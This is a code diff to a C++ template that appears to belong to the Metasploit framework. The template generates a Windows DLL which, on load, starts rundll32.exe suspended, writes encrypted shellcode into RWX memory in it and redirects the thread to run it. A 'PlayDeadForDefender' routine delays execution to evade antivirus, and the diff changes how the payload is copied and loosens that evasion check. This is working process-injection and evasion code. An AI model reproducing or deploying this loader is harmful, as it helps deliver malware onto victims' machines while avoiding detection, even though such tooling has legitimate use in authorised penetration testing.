@@ -5,24 +5,15 @@
 
 #include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
-// TODO: currently, the encrypted payload is stored both in custom section AND .rdata - that is due to fact that bPayload is set by __attribute__ to be stored in custom section, but the class member, which is contains encrypted payload, is stored in .rdata as it is class instance. This would need to be solved by future metasploit developer and have 
-
 #define SCSIZE <%= payload_length %>
 
-auto bPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
+auto bPayload __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
+char finalPayload[<%= payload_length %>];
 
 char szSyncNameS[MAX_PATH] = "Local\\Semaphore:Default\0";
 char szSyncNameE[MAX_PATH] = "Local\\Event:Default\0";
 
-extern "C" inline void inline_bzero(void *p, size_t l)
-{
-	byte *q = (byte *)p;
-	size_t x = 0;
-	for (x = 0; x < l; x++)
-		*(q++) = 0x00;
-}
-
-extern "C" inline int PlayDeadForDefender()
+int PlayDeadForDefender()
 {
 
     DWORD               dwMilliSeconds        = <%=  random_sleep %>;
@@ -52,7 +43,6 @@ extern "C" inline int PlayDeadForDefender()
 }
 
 
-
 extern "C" inline int ExecutePayload(void);
 
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
@@ -60,6 +50,7 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
 	switch (dwReason)
 	{
 		case DLL_PROCESS_ATTACH:
+      memcpy(finalPayload, bPayload, SCSIZE);
 			ExecutePayload();
 			break;
 
@@ -149,7 +140,7 @@ extern "C" inline int ExecutePayload(void) {
 	// Start up the payload in a new process
 	inline_bzero( &si, sizeof( si ));
 	si.cb = sizeof(si);
-
+  
 	if (Synchronize()) {
 		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
 		DWORD result = CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS|CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi);
@@ -163,14 +154,11 @@ extern "C" inline int ExecutePayload(void) {
 			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 			GetThreadContext(pi.hThread, &ctx);
 
-      if( !CALL(&PlayDeadForDefender) )
-      {
-        return 1;
-      }
+      CALL(&PlayDeadForDefender);
 
 			ep = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-			WriteProcessMemory(pi.hProcess,(PVOID)ep, &bPayload, SCSIZE, 0);
+			WriteProcessMemory(pi.hProcess,(PVOID)ep, finalPayload, SCSIZE, 0);
 
 	#ifdef _WIN64
 			ctx.Rip = (DWORD64)ep;
